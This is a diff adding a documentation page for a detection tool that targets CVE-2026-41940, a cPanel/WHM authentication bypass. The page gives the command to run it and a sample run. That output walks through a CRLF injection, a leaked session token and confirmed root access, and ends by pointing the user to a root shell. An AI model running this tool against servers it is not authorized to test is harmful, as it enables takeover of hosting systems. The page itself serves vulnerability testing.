@@ -1,0 +1,73 @@
+---
+title: "Running the CVE-2026-41940 detection check"
+description: "How to run the cPanel/WHM authentication bypass detector against a target. Covers the required --target flag and basic invocation patterns."
+---
+
+The tool is a self-contained Python script that probes a WHM instance for CVE-2026-41940. It requires a single mandatory argument — `--target` — and walks through four stages to confirm whether authentication can be bypassed without valid credentials.
+
+## Basic invocation
+
+Pass the full WHM URL (scheme + host + port) to `--target` and the script does the rest:
+
+```bash
+python watchTowr-vs-cPanel-WHM-AuthBypass-to-RCE.py --target https://target:2087/
+```
+
+The URL must include:
+
+- **Scheme** — `https` (WHM does not serve over plain HTTP by default)
+- **Hostname or IP** — the address of the WHM server
+- **Port** — `2087` is the default WHM port; change it if your instance uses a non-standard port
+
+## CLI arguments
+
+<ParamField path="--target" type="string" required>
+  Full WHM URL to test, e.g. `https://target:2087`. Must include the scheme and port.
+</ParamField>
+
+<ParamField path="--hostname" type="string">
+  Override the `Host:` header sent with every request. When omitted, the tool auto-discovers the canonical hostname by following the 307 redirect that cpsrvd issues from `/openid_connect/cpanelid`.
+</ParamField>
+
+## Example run
+
+The following output shows a successful detection run against a vulnerable instance:
+
+```text
+                     __         ___  ___________
+         __  _  ______ _/  |__ ____ |  |_\__    ____\____  _  ________
+         \ \/ \/ \__  \    ___/ ___\|  |  \|    | /  _ \ \/ \/ \_  __ \
+          \     / / __ \|  | \  \___|   Y  |    |(  <_> \     / |  | \/
+           \/\_/ (____  |__|  \___  |___|__|__  | \__  / \/\_/  |__|
+                          \/          \/     \/
+
+        watchTowr-vs-cPanel-WHM-AuthBypass-to-RCE.py
+
+        (*) cPanel/WHM Authentication Bypass - Detection Artifact Generator
+
+          - Sina Kheirkhah (@SinSinology) of watchTowr (@watchTowrcyber)
+
+        CVEs: [cve-2026-41940]
+
+[0] hostname = target.example.com
+[1] minting a preauth session...
+    session base = :vQ2WC5Bexp0oFSa7
+[2] sending the CRLF injection (Basic auth + no-ob cookie)...
+    HTTP 307, leaked token = /cpsess5691070609
+[3] firing do_token_denied to propagate raw -> cache...
+    HTTP 401, gadget fired
+[4] verifying we're WHM root...
+    /json-api/version -> HTTP 200  {"version":"11.110.0.89"}
+
+[+] now just login to https://target:2087/ and use the terminal option to get a root shell
+```
+
+Each numbered stage maps to a distinct exploitation step. See [Interpreting detection tool output](/usage/output-interpretation) for a breakdown of what each line means.
+
+<Note>
+  When testing against a local VM or container, use the actual IP or hostname of the instance rather than `localhost`. WHM's cpsrvd may redirect `localhost` requests to the canonical hostname, which can confuse hostname auto-discovery.
+</Note>
+
+<Warning>
+  Run this tool only against systems you own or have explicit written authorization to test. Unauthorized use against third-party infrastructure is illegal.
+</Warning>
